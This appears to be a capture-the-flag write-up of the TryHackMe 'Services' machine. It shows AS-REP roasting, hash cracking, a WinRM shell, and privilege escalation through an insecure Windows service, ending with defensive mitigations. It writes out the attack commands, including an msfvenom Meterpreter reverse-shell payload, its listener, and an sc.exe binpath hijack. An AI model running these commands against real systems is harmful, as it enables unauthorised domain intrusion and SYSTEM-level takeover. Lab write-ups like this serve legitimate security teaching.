THM: SERVICES
Challenge Details
Category: [[CyberSecurity]], [[Active Directory]], [[Kerberos]], [[AS-REP Roasting]], [[Hash Cracking]], [[WinRM]], [[Windows Privilege Escalation]], [[Insecure Service]]

Difficulty: Medium

Target: services.local (Windows Domain Controller: IP not shown in log, assumed $target)

Status: #solved

Date Completed: [[2025-12-12]]

## 🚩 Summary of Steps

1. **Reconnaissance:** Full TCP port scan and service version enumeration (Nmap).
    
2. **Initial Access:** Identify domain services (Kerberos, LDAP, SMB).
    
3. **Credential Gathering:** Generate usernames and perform **AS-REP Roasting** to capture a hash.
    
4. **Hash Cracking:** Crack the captured hash using `john` to get cleartext credentials.
    
5. **User Access:** Authenticate via **WinRM** using the cracked credentials to gain a shell as a domain user (`j.rock`).
    
6. **Privilege Escalation:** Identify an **Insecure Service Permission** (`AWSLiteAgent`), replace its executable path with a malicious payload, and restart the service to execute the payload as `NT AUTHORITY\SYSTEM`.
    
7. **Final Goal:** Read the root flag from the resulting privileged Meterpreter session.
    

---

## 🗺️ Phase 1: Reconnaissance (Nmap Scans)

The initial scans provided critical information, confirming the target is a Windows Domain Controller/Server and identifying key services used in Active Directory attacks.

### Full Port & Service Scan Results

|**Port**|**Protocol**|**Service**|**Version/Description**|**Key Takeaway**|
|---|---|---|---|---|
|53|TCP|domain|Simple DNS Plus|DNS service, typical of a DC.|
|**80**|TCP|http|Microsoft IIS httpd 10.0|Website hosting contact list.|
|**88**|TCP|kerberos-sec|Microsoft Windows Kerberos|**AS-REP Roasting potential.**|
|135|TCP|msrpc|Microsoft Windows RPC||
|139|TCP|netbios-ssn|Microsoft Windows netbios-ssn||
|**389**|TCP|ldap|MS Windows Active Directory LDAP|**LDAP enumeration possible.**|
|**445**|TCP|microsoft-ds|SMB/CIFS|**SMB/Authentication possible.**|
|464|TCP|kpasswd5||Kerberos Password Change Protocol.|
|**5985**|TCP|http|Microsoft HTTPAPI httpd 2.0 (WS-Management/WinRM)|**WinRM access possible.**|
|3268|TCP|globalcatLDAP|MS Windows Active Directory LDAP (GC)|Global Catalog service.|
|3389|TCP|ms-wbt-server|Microsoft Terminal Services|RDP service.|

The scan results clearly indicate a Windows machine operating as a Domain Controller for the domain **`services.local`** (from RDP and LDAP output), highlighting ports **88 (Kerberos)**, **389 (LDAP)**, **445 (SMB)**, and **5985 (WinRM)** as prime targets.

---

## 🔓 Phase 2: Initial Access (AS-REP Roasting)

The strategy shifted to exploiting the Kerberos protocol to acquire a crackable hash.

### 1. Username Generation

Names were collected (implied from the web server on port 80) and run through a username generator script:

./username_generator.py -w users > userlist.txt

### 2. AS-REP Roasting Attack

The list of potential usernames was used with `impacket-GetNPUsers` to request an Authentication Service Request (AS-REQ) for users that do not require Kerberos pre-authentication.

|**Command**|**Tool**|**Outcome**|
|---|---|---|
|`impacket-GetNPUsers services.local/ -dc-ip $target -usersfile userlist.txt -outputfile hashes.txt`|`impacket-GetNPUsers`|Captured the AS-REP hash for **`j.rock@SERVICES.LOCAL`**.|

### 3. Hash Cracking

The captured hash was cracked using John the Ripper.

|**Command**|**Tool**|**Outcome**|
|---|---|---|
|`john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`|`john`|Cracked Password: **`Serviceworks1`**|
|**Credentials:**||**`j.rock:Serviceworks1`**|

---

## 💥 Phase 3: User Shell and Privilege Escalation

With valid credentials, the objective was to gain an interactive shell and escalate privileges.

### 1. Verification and Shell Access (WinRM)

The credentials were verified and used to establish a remote PowerShell session via WinRM.

|**Command**|**Tool**|**Purpose**|
|---|---|---|
|`netexec smb $target -u 'j.rock' -p 'Serviceworks1' --users`|`netexec`|Confirmed valid credentials and user existence.|
|`evil-winrm -i $target -u 'j.rock' -p 'Serviceworks1'`|`evil-winrm`|**Successfully gained shell as `services\j.rock`**.|

### 2. Service Misconfiguration Enumeration

Inside the shell, service configuration permissions were checked to find a path for privilege escalation. The listing shows several services with the **`True`** privilege indicating the current user (`j.rock`) may have write permissions on the service configuration or the binary itself.

The service **`AWSLiteAgent`** was targeted:

- **Service Name:** `AWSLiteAgent`
    
- **Original Path:** `"C:\Program Files\Amazon\XenTools\LiteAgent.exe"`
    
- **Privileges:** `True` (User `j.rock` can modify/stop/start the service).
    

### 3. Executing Payload via Insecure Service

A Meterpreter reverse shell was prepared, uploaded, and configured as the new service binary.

1. Create Payload:
    
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.147.86 LPORT=8008 -f exe -o reverse.exe
    
2. Start Listener:
    
    msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.147.86; set LPORT 8008; exploit"
    
3. **Upload Payload** (implied upload via Evil-WinRM to `C:\Users\j.rock\Documents\rev.exe`).
    
4. Modify Service Path (using sc.exe):
    
    sc.exe config AWSLiteAgent binpath="C:\Users\j.rock\Documents\rev.exe"
    
5. Restart Service:
    
    sc.exe stop AWSLiteAgent
    
    sc.exe start AWSLiteAgent
    

The service started, executing the malicious payload, which connected back to the attacker's listener as **`NT AUTHORITY\SYSTEM`**.

### 4. Root Flag Acquisition

From the Meterpreter session running as `SYSTEM`, the root flag was retrieved.

|**Command**|**Output**|
|---|---|
|`type root.txt`|**`THM{S3rv3r_0p3rat0rS}`**|

---

---

## 🛡️ Defensive & Educational Summary

This CTF highlights two significant defensive failures in Active Directory environments:

### 1. AS-REP Roasting Mitigation (Kerberos)

- **Vulnerability:** The Kerberos protocol, by default, requires pre-authentication. If a user account has the "Do not require Kerberos preauthentication" flag set (User Account Control bit `UF_DONT_REQUIRE_PREAUTH`), an attacker can request an encrypted Time Stamp (AS-REP) for that user using _any_ password, and then crack the resulting hash offline.
    
- **Defense:** **Ensure pre-authentication is required for all user accounts.** This is the default setting for modern Active Directory environments and should only be disabled if absolutely necessary (e.g., for some Service Accounts or specific non-Windows services), in which case highly complex, long passwords must be enforced.
    

### 2. Insecure Service Permission Mitigation

- **Vulnerability:** A standard, low-privileged user account (`j.rock` in this case) had permissions (Service Control Manager ACLs) to modify the configuration of an existing service (`AWSLiteAgent`), specifically its binary path (`binpath`). Since services typically run as `SYSTEM` or other high-privilege accounts, changing the binary path to point to a malicious executable grants instant privilege escalation.
    
- **Defense:**
    
    - **Principle of Least Privilege:** Strictly limit which users and groups can modify, stop, or start Windows services. Only **Administrators** should generally have write access to service configurations.
        
    - **Vulnerability Scanners:** Regularly run tools like **PowerUp.ps1** or commercial vulnerability scanners to check Service Control Manager ACLs for misconfigurations that grant non-admin users **WRITE_DAC**, **WRITE_OWNER**, or **GENERIC_WRITE** rights to service configurations.
